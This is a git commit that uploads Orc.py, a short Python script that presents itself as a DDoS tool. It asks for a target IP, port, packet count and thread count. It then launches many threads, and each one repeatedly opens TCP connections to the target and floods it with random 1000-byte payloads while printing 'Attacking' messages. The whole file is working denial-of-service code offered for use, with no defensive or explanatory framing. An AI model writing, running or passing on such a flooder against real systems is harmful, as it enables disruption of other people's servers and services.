e1835f646322fac91c5fcae7c1c01d5040ecdf75
Ucoknet <103237424+Ucoknet@users.noreply.github.com>
2022-04-08 16:32:36 +0700

    Add files via upload

---
+++ Orc.py
@@ -0,0 +1,45 @@
+# Coding Time By : FardhanXWizzSec
+# Tools Usage By : FardhanXWizzSec
+# Tools Credit By : FardhanXWizzSec
+# RelaxMontage TEAM
+
+# Import Module
+import random
+import socket
+import threading
+import os
+# Info Tools [ RM Tools ]
+os.system("clear")
+
+print("•------------------------------------•")
+print("[+] Tools By Orc")
+print("[+] Created By Orc Satiee ")
+print("[+] Dont Leak This Ddos tools")
+print("[!] Dont Rename This Tools!!!")
+print("[#] Credit : Orc satier man")
+print("     || TCP || UDP || HTTPS ||         ")
+print("•-------------------------------------•")
+
+ip = str(input("[/] Enter RDP/VPS IP Nya : "))
+port = int(input("[/] Enter RDP/VPS Port (80/3389)   : "))
+times = int(input("[/] Enter Packet Coy : "))
+threads = int(input("[/] Enter Thread Coy (1000) : "))
+
+def run():
+    data = random._urandom(1000)
+    i = random.choice(("[*]","[!]","[#]","[?]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +" Orc!!!")
+        except socket.error:
+            s.close()
+            print("[!] Attacking By Orc Satier => ",ip," With Port : ",port,"!")
+
+for y in range(threads):
+    th = threading.Thread(target = run)
+    th.start()
